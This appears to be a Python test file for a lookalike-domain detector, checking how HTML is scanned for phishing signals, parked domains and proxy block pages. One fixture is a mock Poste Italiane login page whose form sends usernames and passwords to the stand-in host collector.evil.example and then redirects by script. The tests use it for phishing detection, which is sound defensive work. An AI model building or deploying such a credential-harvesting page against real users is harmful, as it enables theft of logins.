"""
Tests for HTML analysis (phishing signals, parking, web-filter pages).
"""

from omomorfinder.content import analyze_html, count_word
from omomorfinder.models import PageInfo

PHISH = """
<html><head><title>Accedi - Poste</title><link rel="icon" href="/fav.png"></head>
<body><header><img src="/img/logo-poste.png" alt="Poste logo"><img src="/img/facebook.png"></header>
<form action="https://collector.evil.example/p.php" method="post">
  <input name="username" placeholder="Email"><input type="password" name="pwd">
</form>
<p>Verifica il tuo conto: accesso bloccato. Poste Italiane.</p>
<script>window.location = "https://elsewhere.example";</script>
</body></html>
"""


def test_count_word_whole_words_only() -> None:
    """
    Brand counting ignores longer words that merely contain the brand.

    Returns:
        None
    """
    assert count_word("poste italiane, posteo e riposte. poste!", "poste") == 2


def test_phishing_page_signals() -> None:
    """
    A credential-harvesting page exposes every expected signal.

    Returns:
        None
    """
    info = PageInfo(url="https://p0ste.example/")
    analyze_html(PHISH, "https://p0ste.example/", ["poste"], info)
    assert info.has_password and info.has_login_form
    assert info.external_form_actions == ["collector.evil.example"]
    assert info.js_redirect
    assert info.brand_mentions >= 1
    assert "accesso" in info.phishing_keywords
    assert any(u.endswith("logo-poste.png") for u in info.image_urls)
    assert not any("facebook" in u for u in info.image_urls)


def test_parking_page() -> None:
    """
    For-sale pages are flagged as parked.

    Returns:
        None
    """
    info = PageInfo()
    analyze_html("<title>x</title><body>This domain is for sale! Make an offer.</body>",
                 "http://x.example/", ["brand"], info)
    assert info.parked


def test_web_filter_page_is_neutralised() -> None:
    """
    Block pages injected by a local proxy are not analysed as site content.

    Returns:
        None
    """
    info = PageInfo()
    html = "<title>Web Filter Violation</title><body>poste-login.example blocked <input type=password></body>"
    analyze_html(html, "https://poste-login.example/", ["poste"], info)
    assert info.filtered
    assert not info.has_password and info.brand_mentions == 0 and info.text == ""
